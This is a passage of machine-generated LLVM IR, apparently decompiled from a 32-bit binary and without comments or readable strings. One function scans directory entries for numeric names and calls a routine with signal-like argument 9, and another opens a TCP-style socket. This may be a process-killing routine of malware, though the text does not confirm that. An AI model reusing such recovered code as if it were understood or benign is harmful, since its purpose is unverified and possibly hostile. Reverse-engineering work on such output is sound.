  %v2_10004cb4 = add i32 %v1_10004cb4.lcssa, %v0_10004c08.pre
  store i32 %v2_10004cb4, i32* @r31, align 4
  %v3_10004cb8 = add i32 %v2_10004cac, 32
  %v4_10004cb8 = inttoptr i32 %v3_10004cb8 to i8*
  store i8 0, i8* %v4_10004cb8, align 1
  %v0_10004cbc = load i32, i32* @r31, align 4
  store i32 268455108, i32* @lr, align 4
  %v1_10004cc0 = inttoptr i32 %v0_10004cbc to i8*
  %v2_10004cc0 = call i32 @function_100074dc(i8* %v1_10004cc0)
  %v2_10004cc4 = icmp sgt i32 %v2_10004cc0, 15
  br i1 %v2_10004cc4, label %dec_label_pc_10004b20.backedge, label %dec_label_pc_10004ccc

dec_label_pc_10004ccc:                            ; preds = %dec_label_pc_10004cac
  %v0_10004ccc = load i32, i32* @r31, align 4
  store i32 %v2_10004b1c, i32* @r3, align 4
  %v2_10004cd4 = bitcast i32* %stack_var_-8792 to i8*
  %v3_10004cd4 = call i32 @function_10007504(i8* %v2_10004cd4, i32 %v0_10004ccc)
  br label %dec_label_pc_10004cd8

dec_label_pc_10004cd8.loopexit:                   ; preds = %dec_label_pc_10004b20.backedge, %dec_label_pc_10004b1c
  %.pre = bitcast i32* %stack_var_-8792 to i8*
  br label %dec_label_pc_10004cd8

dec_label_pc_10004cd8:                            ; preds = %dec_label_pc_10004cd8.loopexit, %dec_label_pc_10004ccc
  %v1_10004ce4.pre-phi = phi i8* [ %.pre, %dec_label_pc_10004cd8.loopexit ], [ %v2_10004cd4, %dec_label_pc_10004ccc ]
  store i32 268455136, i32* @lr, align 4
  %v0_10004cdc = call i32 @function_10007d68()
  store i32 268455144, i32* @lr, align 4
  %v2_10004ce4 = call i32 @function_100074dc(i8* %v1_10004ce4.pre-phi)
  %v3_10004ce8 = icmp eq i32 %v2_10004ce4, 0
  br i1 %v3_10004ce8, label %dec_label_pc_10004fb0, label %dec_label_pc_10004cf0

dec_label_pc_10004cf0:                            ; preds = %dec_label_pc_10004cd8
  %v3_10004cf8 = call i32 @function_10006bb0(i32 6, i32* null)
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 268455172, i32* @lr, align 4
  %v1_10004d00 = call i32 @function_100082b4(i32 %v3_10004cf8)
  store i32 %v1_10004d00, i32* @r23, align 4
  %v3_10004d04 = icmp eq i32 %v1_10004d00, 0
  br i1 %v3_10004d04, label %dec_label_pc_10004f38, label %dec_label_pc_10004d0c

dec_label_pc_10004d0c:                            ; preds = %dec_label_pc_10004cf0
  store i32 0, i32* @r28, align 4
  store i32 268455192, i32* @lr, align 4
  %v1_10004d147 = inttoptr i32 %v1_10004d00 to i32*
  %v2_10004d148 = call i32 @function_100083c4(i32* %v1_10004d147)
  %v3_10004d1811 = icmp eq i32 %v2_10004d148, 0
  br i1 %v3_10004d1811, label %dec_label_pc_10004f2c, label %dec_label_pc_10004d20.preheader.lr.ph

dec_label_pc_10004d20.preheader.lr.ph:            ; preds = %dec_label_pc_10004d0c
  %v2_10004d54 = bitcast i32* %stack_var_-8247 to i8*
  %v1_10004ec4 = bitcast i32* %stack_var_-4151 to i8*
  br label %dec_label_pc_10004d20.preheader

dec_label_pc_10004d10.loopexit:                   ; preds = %dec_label_pc_10004d28, %dec_label_pc_10004d40, %dec_label_pc_10004da8
  %v0_10004d10 = load i32, i32* @r23, align 4
  store i32 268455192, i32* @lr, align 4
  %v1_10004d14 = inttoptr i32 %v0_10004d10 to i32*
  %v2_10004d14 = call i32 @function_100083c4(i32* %v1_10004d14)
  %v3_10004d18 = icmp eq i32 %v2_10004d14, 0
  br i1 %v3_10004d18, label %dec_label_pc_10004f2c, label %dec_label_pc_10004d20.preheader

dec_label_pc_10004d20.preheader:                  ; preds = %dec_label_pc_10004d20.preheader.lr.ph, %dec_label_pc_10004d10.loopexit
  %v0_10004d2835 = phi i32 [ %v2_10004d148, %dec_label_pc_10004d20.preheader.lr.ph ], [ %v2_10004d14, %dec_label_pc_10004d10.loopexit ]
  br label %dec_label_pc_10004d20

dec_label_pc_10004d20:                            ; preds = %dec_label_pc_10004d20.preheader, %dec_label_pc_10004f14
  %v0_10004d28 = phi i32 [ %v0_10004d2835, %dec_label_pc_10004d20.preheader ], [ %v2_10004f20, %dec_label_pc_10004f14 ]
  %v0_10004d20 = load i32, i32* @r28, align 4
  %v3_10004d20 = icmp eq i32 %v0_10004d20, 0
  br i1 %v3_10004d20, label %dec_label_pc_10004d28, label %dec_label_pc_10004f2c

dec_label_pc_10004d28:                            ; preds = %dec_label_pc_10004d20
  %v1_10004d28 = add i32 %v0_10004d28, 11
  %v2_10004d28 = inttoptr i32 %v1_10004d28 to i8*
  %v3_10004d28 = load i8, i8* %v2_10004d28, align 1
  %v4_10004d28 = zext i8 %v3_10004d28 to i32
  store i32 %v1_10004d28, i32* @r30, align 4
  %v1_10004d30 = add nuw nsw i32 %v4_10004d28, 208
  %v1_10004d34 = urem i32 %v1_10004d30, 256
  %v2_10004d38 = icmp ugt i32 %v1_10004d34, 9
  br i1 %v2_10004d38, label %dec_label_pc_10004d10.loopexit, label %dec_label_pc_10004d40

dec_label_pc_10004d40:                            ; preds = %dec_label_pc_10004d28
  %v3_10004d48 = call i32 @function_10006bb0(i32 6, i32* null)
  store i32 %v2_10004a4c, i32* @r3, align 4
  %v3_10004d54 = call i32 @function_10007504(i8* %v2_10004d54, i32 %v3_10004d48)
  store i32 268455264, i32* @lr, align 4
  %v2_10004d5c = call i32 @function_100074dc(i8* %v2_10004d54)
  %v0_10004d60 = load i32, i32* @r30, align 4
  %v0_10004d64 = load i32, i32* @r27, align 4
  %v2_10004d64 = add i32 %v0_10004d64, %v2_10004d5c
  store i32 %v2_10004d64, i32* @r3, align 4
  %v2_10004d68 = inttoptr i32 %v2_10004d64 to i8*
  %v3_10004d68 = call i32 @function_10007504(i8* %v2_10004d68, i32 %v0_10004d60)
  store i32 268455284, i32* @lr, align 4
  %v2_10004d70 = call i32 @function_100074dc(i8* %v2_10004d54)
  %v3_10004d80 = call i32 @function_10006bb0(i32 7, i32* null)
  %v0_10004d88 = load i32, i32* @r27, align 4
  %v2_10004d88 = add i32 %v2_10004d70, %v0_10004d88
  store i32 %v2_10004d88, i32* @r3, align 4
  %v2_10004d8c = inttoptr i32 %v2_10004d88 to i8*
  %v3_10004d8c = call i32 @function_10007504(i8* %v2_10004d8c, i32 %v3_10004d80)
  store i32 4096, i32* @r5, align 4
  store i32 268455328, i32* @lr, align 4
  %v3_10004d9c = call i32 @function_10007fe8(i32 %v2_10004a4c, i32 %v2_10004a54, i32 4096)
  %v3_10004da0 = icmp eq i32 %v3_10004d9c, -1
  br i1 %v3_10004da0, label %dec_label_pc_10004d10.loopexit, label %dec_label_pc_10004da8

dec_label_pc_10004da8:                            ; preds = %dec_label_pc_10004d40
  %v3_10004db0 = call i32 @function_10006bb0(i32 6, i32* null)
  store i32 %v2_10004a4c, i32* @r3, align 4
  %v3_10004dbc = call i32 @function_10007504(i8* %v2_10004d54, i32 %v3_10004db0)
  store i32 268455368, i32* @lr, align 4
  %v2_10004dc4 = call i32 @function_100074dc(i8* %v2_10004d54)
  %v0_10004dc8 = load i32, i32* @r30, align 4
  %v0_10004dcc = load i32, i32* @r27, align 4
  %v2_10004dcc = add i32 %v0_10004dcc, %v2_10004dc4
  store i32 %v2_10004dcc, i32* @r3, align 4
  %v2_10004dd0 = inttoptr i32 %v2_10004dcc to i8*
  %v3_10004dd0 = call i32 @function_10007504(i8* %v2_10004dd0, i32 %v0_10004dc8)
  store i32 268455388, i32* @lr, align 4
  %v2_10004dd8 = call i32 @function_100074dc(i8* %v2_10004d54)
  %v3_10004de8 = call i32 @function_10006bb0(i32 9, i32* null)
  %v0_10004df0 = load i32, i32* @r27, align 4
  %v2_10004df0 = add i32 %v2_10004dd8, %v0_10004df0
  store i32 %v2_10004df0, i32* @r3, align 4
  %v2_10004df4 = inttoptr i32 %v2_10004df0 to i8*
  %v3_10004df4 = call i32 @function_10007504(i8* %v2_10004df4, i32 %v3_10004de8)
  store i32 268455424, i32* @lr, align 4
  %v1_10004dfc = call i32 @function_100082b4(i32 %v2_10004a4c)
  store i32 %v1_10004dfc, i32* @r25, align 4
  %v3_10004e00 = icmp eq i32 %v1_10004dfc, 0
  br i1 %v3_10004e00, label %dec_label_pc_10004d10.loopexit, label %dec_label_pc_10004e08

dec_label_pc_10004e08.loopexit:                   ; preds = %dec_label_pc_10004e28, %dec_label_pc_10004ec4
  %v0_10004e08.pre = load i32, i32* @r25, align 4
  br label %dec_label_pc_10004e08

dec_label_pc_10004e08:                            ; preds = %dec_label_pc_10004da8, %dec_label_pc_10004e08.loopexit
  %v0_10004e08 = phi i32 [ %v0_10004e08.pre, %dec_label_pc_10004e08.loopexit ], [ %v1_10004dfc, %dec_label_pc_10004da8 ]
  store i32 268455440, i32* @lr, align 4
  %v1_10004e0c = inttoptr i32 %v0_10004e08 to i32*
  %v2_10004e0c = call i32 @function_100083c4(i32* %v1_10004e0c)
  store i32 4096, i32* @r4, align 4
  store i32 %v2_10004e0c, i32* @r31, align 4
  %v3_10004e14 = icmp eq i32 %v2_10004e0c, 0
  %v0_10004e18 = load i32, i32* @r28, align 4
  store i32 %v2_10004a54, i32* @r3, align 4
  %v3_10004e18.not = icmp ne i32 %v0_10004e18, 0
  %brmerge = or i1 %v3_10004e14, %v3_10004e18.not
  br i1 %brmerge, label %dec_label_pc_10004f14, label %dec_label_pc_10004e28

dec_label_pc_10004e28:                            ; preds = %dec_label_pc_10004e08
  store i32 268455468, i32* @lr, align 4
  %v0_10004e28 = call i32 @function_10007584()
  %v3_10004e34 = call i32 @function_10006bb0(i32 6, i32* null)
  store i32 %v2_10004a4c, i32* @r3, align 4
  %v3_10004e40 = call i32 @function_10007504(i8* %v2_10004d54, i32 %v3_10004e34)
  store i32 268455500, i32* @lr, align 4
  %v2_10004e48 = call i32 @function_100074dc(i8* %v2_10004d54)
  %v0_10004e4c = load i32, i32* @r30, align 4
  %v0_10004e50 = load i32, i32* @r27, align 4
  %v2_10004e50 = add i32 %v0_10004e50, %v2_10004e48
  store i32 %v2_10004e50, i32* @r3, align 4
  %v2_10004e54 = inttoptr i32 %v2_10004e50 to i8*
  %v3_10004e54 = call i32 @function_10007504(i8* %v2_10004e54, i32 %v0_10004e4c)
  store i32 268455520, i32* @lr, align 4
  %v2_10004e5c = call i32 @function_100074dc(i8* %v2_10004d54)
  %v3_10004e6c = call i32 @function_10006bb0(i32 9, i32* null)
  %v0_10004e74 = load i32, i32* @r27, align 4
  %v2_10004e74 = add i32 %v2_10004e5c, %v0_10004e74
  store i32 %v2_10004e74, i32* @r3, align 4
  %v2_10004e78 = inttoptr i32 %v2_10004e74 to i8*
  %v3_10004e78 = call i32 @function_10007504(i8* %v2_10004e78, i32 %v3_10004e6c)
  store i32 268455556, i32* @lr, align 4
  %v2_10004e80 = call i32 @function_100074dc(i8* %v2_10004d54)
  %v0_10004e8c = load i32, i32* @r27, align 4
  %v2_10004e8c = add i32 %v0_10004e8c, %v2_10004e80
  store i32 %v2_10004e8c, i32* @r3, align 4
  %v2_10004e90 = inttoptr i32 %v2_10004e8c to i8*
  %v3_10004e90 = call i32 @function_10007504(i8* %v2_10004e90, i32 ptrtoint (i32* @global_var_1000a7bc.8 to i32))
  store i32 268455580, i32* @lr, align 4
  %v2_10004e98 = call i32 @function_100074dc(i8* %v2_10004d54)
  %v0_10004e9c = load i32, i32* @r31, align 4
  %v1_10004e9c = add i32 %v0_10004e9c, 11
  %v0_10004ea0 = load i32, i32* @r27, align 4
  %v2_10004ea0 = add i32 %v0_10004ea0, %v2_10004e98
  store i32 %v2_10004ea0, i32* @r3, align 4
  %v2_10004ea4 = inttoptr i32 %v2_10004ea0 to i8*
  %v3_10004ea4 = call i32 @function_10007504(i8* %v2_10004ea4, i32 %v1_10004e9c)
  store i32 268455608, i32* @lr, align 4
  %v3_10004eb4 = call i32 @function_10007fe8(i32 %v2_10004a4c, i32 %v2_10004a54, i32 4096)
  %v3_10004eb8 = icmp eq i32 %v3_10004eb4, -1
  br i1 %v3_10004eb8, label %dec_label_pc_10004e08.loopexit, label %dec_label_pc_10004ec4

dec_label_pc_10004ec4:                            ; preds = %dec_label_pc_10004e28
  store i32 268455624, i32* @lr, align 4
  %v2_10004ec4 = call i32 @function_100074dc(i8* %v1_10004ec4)
  %v4_10004ed4 = call i32 @function_1000788c(i8* %v1_10004ec4, i32 %v2_10004ec4, i32 %v2_10004b1c)
  %v3_10004edc = icmp eq i32 %v4_10004ed4, -1
  %v0_10004ee0 = load i32, i32* @r30, align 4
  store i32 %v0_10004ee0, i32* @r3, align 4
  br i1 %v3_10004edc, label %dec_label_pc_10004e08.loopexit, label %dec_label_pc_10004ee8

dec_label_pc_10004ee8:                            ; preds = %dec_label_pc_10004ec4
  store i32 268455660, i32* @lr, align 4
  %v2_10004ee8 = call i32 @function_10007604(i32 %v0_10004ee0, i32 10)
  store i32 268455668, i32* @lr, align 4
  %v2_10004ef0 = call i32 @function_10007e88(i32 %v2_10004ee8, i32 9)
  %v0_10004ef4 = load i32, i32* @r25, align 4
  store i32 268455676, i32* @lr, align 4
  %v1_10004ef8 = inttoptr i32 %v0_10004ef4 to i32*
  %v2_10004ef8 = call i32 @function_100083c4(i32* %v1_10004ef8)
  store i32 1, i32* @r28, align 4
  store i32 %v2_10004ef8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10004f14

dec_label_pc_10004f14:                            ; preds = %dec_label_pc_10004e08, %dec_label_pc_10004ee8
  %v0_10004f14 = load i32, i32* @r25, align 4
  store i32 268455708, i32* @lr, align 4
  %v1_10004f18 = inttoptr i32 %v0_10004f14 to i32*
  %v2_10004f18 = call i32 @function_10008210(i32* %v1_10004f18)
  %v0_10004f1c = load i32, i32* @r23, align 4
  store i32 268455716, i32* @lr, align 4
  %v1_10004f20 = inttoptr i32 %v0_10004f1c to i32*
  %v2_10004f20 = call i32 @function_100083c4(i32* %v1_10004f20)
  %v3_10004f24 = icmp eq i32 %v2_10004f20, 0
  br i1 %v3_10004f24, label %dec_label_pc_10004f2c, label %dec_label_pc_10004d20

dec_label_pc_10004f2c:                            ; preds = %dec_label_pc_10004d10.loopexit, %dec_label_pc_10004f14, %dec_label_pc_10004d20, %dec_label_pc_10004d0c
  %v0_10004f2c = load i32, i32* @r23, align 4
  %v0_10004f30 = load i32, i32* @r28, align 4
  %v1_10004f30 = urem i32 %v0_10004f30, 256
  store i32 %v1_10004f30, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10004f38.75 to i32), i32* @lr, align 4
  %v1_10004f34 = inttoptr i32 %v0_10004f2c to i32*
  %v2_10004f34 = call i32 @function_10008210(i32* %v1_10004f34)
  br label %dec_label_pc_10004f38

dec_label_pc_10004f38:                            ; preds = %dec_label_pc_10004cf0, %dec_label_pc_10004f2c
  store i32 ptrtoint ([3 x i8]* @global_var_10004f40.76 to i32), i32* @lr, align 4
  %v1_10004f3c = call i32 @function_1000965c(i32 1)
  store i32 ptrtoint ([3 x i8]* @global_var_10004f48.77 to i32), i32* @lr, align 4
  %v1_10004f44 = call i32 @function_10006bd8(i32 6)
  store i32 ptrtoint ([3 x i8]* @global_var_10004f50.78 to i32), i32* @lr, align 4
  %v1_10004f4c = call i32 @function_10006bd8(i32 7)
  store i32 268455768, i32* @lr, align 4
  %v1_10004f54 = call i32 @function_10006bd8(i32 9)
  br label %dec_label_pc_10004f58

dec_label_pc_10004f58:                            ; preds = %dec_label_pc_10004ae0, %dec_label_pc_10004f38
  %v0_10004f5c = load i32, i32* @r31, align 4
  store i32 %v0_10004a80, i32* @r23, align 4
  store i32 %v0_10004a68, i32* @r25, align 4
  store i32 %v0_10004a48, i32* @r27, align 4
  store i32 %v0_10004a88, i32* @r28, align 4
  store i32 %v0_10004a58, i32* @r29, align 4
  store i32 %v0_10004a70, i32* @r30, align 4
  store i32 %v0_10004a78, i32* @r31, align 4
  ret i32 %v0_10004f5c

dec_label_pc_10004f90:                            ; preds = %dec_label_pc_10004c1c
  %v3_10004c1c = icmp eq i32 %v0_10004c5075, 0
  %v1_10004f90 = add i32 %v0_10004c5075, 1
  br i1 %v3_10004c1c, label %dec_label_pc_10004f98, label %dec_label_pc_10004c24

dec_label_pc_10004f98:                            ; preds = %dec_label_pc_10004f90
  %v0_10004f98 = load i32, i32* %r26.global-to-local, align 4
  %v2_10004f98 = add i32 %v0_10004f98, %v1_10004cb477
  %v1_10004f9c = add i32 %v2_10004f98, 33
  %v2_10004f9c = inttoptr i32 %v1_10004f9c to i8*
  %v3_10004f9c = load i8, i8* %v2_10004f9c, align 1
  %v3_10004fa0 = icmp eq i8 %v3_10004f9c, 65
  br i1 %v3_10004fa0, label %dec_label_pc_10004fa8, label %dec_label_pc_10004c00

dec_label_pc_10004fa8:                            ; preds = %dec_label_pc_10004f98
  br label %dec_label_pc_10004c00.outer

dec_label_pc_10004fb0:                            ; preds = %dec_label_pc_10004cd8
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10004fbc.79 to i32), i32* @lr, align 4
  %v1_10004fb8 = call i32 @function_10006bd8(i32 6)
  store i32 ptrtoint ([3 x i8]* @global_var_10004fc4.80 to i32), i32* @lr, align 4
  %v1_10004fc0 = call i32 @function_10006bd8(i32 7)
  store i32 268455884, i32* @lr, align 4
  %v1_10004fc8 = call i32 @function_10006bd8(i32 9)
  %v0_10004fd0 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10004a80, i32* @r23, align 4
  store i32 %v0_10004a68, i32* @r25, align 4
  store i32 %v0_10004a48, i32* @r27, align 4
  store i32 %v0_10004a88, i32* @r28, align 4
  store i32 %v0_10004a58, i32* @r29, align 4
  store i32 %v0_10004a70, i32* @r30, align 4
  store i32 %v0_10004a78, i32* @r31, align 4
  ret i32 %v0_10004fd0

dec_label_pc_10005004:                            ; preds = %dec_label_pc_10004a38
  store i8 48, i8* %stack_var_-8776, align 1
  br label %dec_label_pc_10004ae0

; uselistorder directives
  uselistorder i32 %v2_10004f20, { 1, 0 }
  uselistorder i32 %v1_10004cb4.lcssa, { 5, 3, 2, 1, 0, 4 }
  uselistorder i32 %v0_10004c5075, { 2, 0, 4, 1, 3 }
  uselistorder i32 %v1_10004cb477, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_10004c3422, { 1, 0 }
  uselistorder i32 %v1_10004bd0, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_10004b1c, { 1, 0, 2 }
  uselistorder i32 %v2_10004a6c, { 1, 0 }
  uselistorder i32 %v2_10004a4c, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i8* %stack_var_-8776, { 2, 0, 1 }
  uselistorder i8* %stack_var_-8760, { 1, 3, 0, 2 }
  uselistorder i32* %stack_var_-8792, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @function_10007604, { 4, 3, 2, 1, 0 }
  uselistorder i32 268455192, { 1, 0 }
  uselistorder i8 58, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_1000773c, { 1, 0 }
  uselistorder i32 268454704, { 1, 0 }
  uselistorder label %dec_label_pc_10004f58, { 1, 0 }
  uselistorder label %dec_label_pc_10004f38, { 1, 0 }
  uselistorder label %dec_label_pc_10004f2c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10004f14, { 1, 0 }
  uselistorder label %dec_label_pc_10004e08, { 1, 0 }
  uselistorder label %dec_label_pc_10004e08.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10004d20, { 1, 0 }
  uselistorder label %dec_label_pc_10004d20.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10004d10.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004c60, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10004c4c, { 1, 0 }
  uselistorder label %dec_label_pc_10004c24, { 1, 0 }
  uselistorder label %dec_label_pc_10004c00, { 1, 0 }
  uselistorder label %dec_label_pc_10004bc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004b78, { 1, 0 }
  uselistorder label %dec_label_pc_10004b20.backedge, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10004b38, { 1, 0 }
  uselistorder label %dec_label_pc_10004ae0, { 1, 0 }
}

define i32 @function_10005028(i32 %arg1) local_unnamed_addr {
dec_label_pc_10005028:
  %r11.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-8440 = alloca i32, align 4
  %stack_var_-8456 = alloca i32, align 4
  %stack_var_-8444 = alloca i32, align 4
  %stack_var_-8448 = alloca i32, align 4
  %stack_var_-8452 = alloca i32, align 4
  %stack_var_-8276 = alloca i32, align 4
  %stack_var_-8340 = alloca i32, align 4
  %stack_var_-8404 = alloca i32, align 4
  %stack_var_-8420 = alloca i32, align 4
  %stack_var_-4180 = alloca i32, align 4
  %stack_var_-8436 = alloca i32, align 4
  %v0_10005034 = load i32, i32* @r28, align 4
  %v0_10005054 = load i32, i32* @r23, align 4
  %v0_10005068 = load i32, i32* @r29, align 4
  store i32 268456056, i32* @lr, align 4
  %v0_10005074 = call i32 @function_10008138()
  store i32 %v0_10005074, i32* @r28, align 4
  store i32 268456064, i32* @lr, align 4
  %v0_1000507c = call i32 @function_10007db0()
  store i32 %v0_1000507c, i32* @global_var_1001b29c.81, align 4
  %tmp85 = icmp slt i32 %v0_1000507c, 1
  br i1 %tmp85, label %dec_label_pc_100050dc, label %dec_label_pc_10005090

dec_label_pc_10005090:                            ; preds = %dec_label_pc_10005240, %dec_label_pc_10005138, %dec_label_pc_100050dc, %dec_label_pc_10005028
  %v0_100050d8 = phi i32 [ -1, %dec_label_pc_10005138 ], [ -1, %dec_label_pc_100050dc ], [ %v0_1000507c, %dec_label_pc_10005028 ], [ 0, %dec_label_pc_10005240 ]
  store i32 %v0_10005054, i32* @r23, align 4
  store i32 %v0_10005034, i32* %r28.global-to-local, align 4
  store i32 %v0_10005068, i32* %r29.global-to-local, align 4
  ret i32 %v0_100050d8

dec_label_pc_100050dc:                            ; preds = %dec_label_pc_10005028
  %v3_100050dc = icmp eq i32 %v0_1000507c, -1
  br i1 %v3_100050dc, label %dec_label_pc_10005090, label %dec_label_pc_100050e4

dec_label_pc_100050e4:                            ; preds = %dec_label_pc_100050dc
  store i32 0, i32* @r30, align 4
  store i32 2, i32* %stack_var_-8436, align 4
  store i32 ptrtoint (i32* @global_var_100050fc.82 to i32), i32* @lr, align 4
  %v1_100050f8 = call i32 @function_10004a38(i32 23)
  store i32 268456212, i32* @lr, align 4
  %v3_10005110 = call i32 @function_10008b34(i32 2, i32 1, i32 0)
  %v3_10005114 = icmp eq i32 %v3_10005110, -1
  store i32 %v3_10005110, i32* @r31, align 4
  br i1 %v3_10005114, label %dec_label_pc_10005138, label %dec_label_pc_10005120

dec_label_pc_10005120:                            ; preds = %dec_label_pc_100050e4
  %v2_10005120 = ptrtoint i32* %stack_var_-8436 to i32
  store i32 268456236, i32* @lr, align 4
  %v3_10005128 = call i32 @function_10008900(i32 %v2_10005120, i32 16, i32 16)
  %v0_1000512c = load i32, i32* @r31, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005138.83 to i32), i32* @lr, align 4
  %v2_10005134 = call i32 @function_100089d8(i32 %v0_1000512c, i32 1)
  br label %dec_label_pc_10005138

dec_label_pc_10005138:                            ; preds = %dec_label_pc_100050e4, %dec_label_pc_10005120
  store i32 268456260, i32* @lr, align 4
  %v1_10005140 = call i32 @function_1000965c(i32 5)
  store i32 4096, i32* @r3, align 4
  store i32 268456268, i32* @lr, align 4
  %v0_10005148 = call i32 @function_10008d68()
  store i32 %v0_10005148, i32* %r11.global-to-local, align 4
  %v0_10005158 = load i32, i32* @r30, align 4
  %v1_10005158 = trunc i32 %v0_10005158 to i8
  %v3_10005158 = inttoptr i32 %v0_10005148 to i8*
  store i8 %v1_10005158, i8* %v3_10005158, align 1
  %v2_1000515c = ptrtoint i32* %stack_var_-4180 to i32
  store i32 %v2_1000515c, i32* %r21.global-to-local, align 4
  %v0_10005160 = load i32, i32* @r30, align 4
  store i32 %v0_10005160, i32* @global_var_1001b294.84, align 4
  %v0_10005164 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10005164, i32* @global_var_1001b298.85, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000516c.86 to i32), i32* @lr, align 4
  %v1_10005168 = call i32 @function_10006c64(i32 6)
  store i32 268456308, i32* @lr, align 4
  %v1_10005170 = call i32 @function_10006c64(i32 7)
  %v3_1000517c = call i32 @function_10006bb0(i32 6, i32* null)
  store i32 %v2_1000515c, i32* @r3, align 4
  %v2_10005188 = bitcast i32* %stack_var_-4180 to i8*
  %v3_10005188 = call i32 @function_10007504(i8* %v2_10005188, i32 %v3_1000517c)
  %v0_1000518c = load i32, i32* %r21.global-to-local, align 4
  %v2_1000518c = add i32 %v0_1000518c, %v3_10005188
  store i32 %v2_1000518c, i32* %r29.global-to-local, align 4
  store i32 268456340, i32* @lr, align 4
  %v0_10005190 = call i32 @function_10007df8()
  %v2_10005194 = ptrtoint i32* %stack_var_-8420 to i32
  %v3_1000519c = trunc i32 %v0_10005190 to i8
  %v4_1000519c = call i32 @function_10007a3c(i8 %v3_1000519c, i32 10, i32 %v2_10005194)
  store i32 %v2_1000518c, i32* @r3, align 4
  %v2_100051a8 = inttoptr i32 %v2_1000518c to i8*
  %v3_100051a8 = call i32 @function_10007504(i8* %v2_100051a8, i32 %v4_1000519c)
  %v0_100051b0 = load i32, i32* %r29.global-to-local, align 4
  %v2_100051b0 = add i32 %v0_100051b0, %v3_100051a8
  store i32 %v2_100051b0, i32* %r29.global-to-local, align 4
  %v3_100051b8 = call i32 @function_10006bb0(i32 7, i32* null)
  store i32 %v2_100051b0, i32* @r3, align 4
  %v2_100051c4 = inttoptr i32 %v2_100051b0 to i8*
  %v3_100051c4 = call i32 @function_10007504(i8* %v2_100051c4, i32 %v3_100051b8)
  store i32 %v3_100051c4, i32* @r31, align 4
  store i32 268456412, i32* @lr, align 4
  %v2_100051d8 = call i32 @function_10007ed0(i32 %v2_1000515c, i32 0)
  %v3_100051dc = icmp eq i32 %v2_100051d8, -1
  br i1 %v3_100051dc, label %dec_label_pc_10005090, label %dec_label_pc_100051e4

dec_label_pc_100051e4:                            ; preds = %dec_label_pc_10005138
  store i32 ptrtoint ([3 x i8]* @global_var_100051e8.87 to i32), i32* @lr, align 4
  %v0_100051e4 = call i32 @function_10007d68()
  store i32 ptrtoint ([3 x i8]* @global_var_100051f0.88 to i32), i32* @lr, align 4
  %v1_100051ec = call i32 @function_10006bd8(i32 6)
  store i32 268456440, i32* @lr, align 4
  %v1_100051f4 = call i32 @function_10006bd8(i32 7)
  %v3_100051f8 = load i32, i32* @global_var_1001b298.85, align 4
  store i32 268456456, i32* @lr, align 4
  %v3_10005204 = call i32 @function_10007fe8(i32 %v2_1000515c, i32 %v3_100051f8, i32 4095)
  %v3_10005208 = icmp eq i32 %v3_10005204, -1
  br i1 %v3_10005208, label %dec_label_pc_10005218, label %dec_label_pc_10005210

dec_label_pc_10005210:                            ; preds = %dec_label_pc_100051e4
  %v3_10005210 = load i32, i32* @global_var_1001b298.85, align 4
  %v0_10005214 = load i32, i32* @r30, align 4
  %v3_10005214 = trunc i32 %v0_10005214 to i8
  %v4_10005214 = add i32 %v3_10005210, %v3_10005204
  %v5_10005214 = inttoptr i32 %v4_10005214 to i8*
  store i8 %v3_10005214, i8* %v5_10005214, align 1
  br label %dec_label_pc_10005218

dec_label_pc_10005218:                            ; preds = %dec_label_pc_100051e4, %dec_label_pc_10005210
  %v0_10005218 = load i32, i32* %r29.global-to-local, align 4
  %v1_10005218 = load i32, i32* @r31, align 4
  %v2_10005218 = add i32 %v1_10005218, %v0_10005218
  store i32 %v2_1000515c, i32* @r3, align 4
  %v0_10005220 = load i32, i32* %r21.global-to-local, align 4
  %v2_10005220 = sub i32 %v2_10005218, %v0_10005220
  store i32 %v2_10005220, i32* @r4, align 4
  %v0_10005224 = load i32, i32* @r28, align 4
  store i32 %v0_10005224, i32* %r29.global-to-local, align 4
  store i32 268456492, i32* @lr, align 4
  %v0_10005228 = call i32 @function_10007584()
  store i32 400, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  %v2_10005234 = ptrtoint i32* %stack_var_-8404 to i32
  store i32 %v2_10005234, i32* @r22, align 4
  %v2_10005238 = ptrtoint i32* %stack_var_-8340 to i32
  store i32 %v2_10005238, i32* %r20.global-to-local, align 4
  %v2_1000523c = ptrtoint i32* %stack_var_-8276 to i32
  %v2_1000530c = bitcast i32* %stack_var_-8404 to i8*
  %v2_10005350 = bitcast i32* %stack_var_-8340 to i8*
  %v3_100053d8 = bitcast i32* %stack_var_-8276 to i8*
  br label %dec_label_pc_10005240

dec_label_pc_10005240:                            ; preds = %dec_label_pc_100052d0, %dec_label_pc_10005218
  store i32 268456520, i32* @lr, align 4
  %v1_10005244 = call i32 @function_10006c64(i32 6)
  %v3_10005250 = call i32 @function_10006bb0(i32 6, i32* null)
  store i32 268456536, i32* @lr, align 4
  %v1_10005254 = call i32 @function_100082b4(i32 %v3_10005250)
  store i32 %v1_10005254, i32* @r27, align 4
  %v3_10005258 = icmp eq i32 %v1_10005254, 0
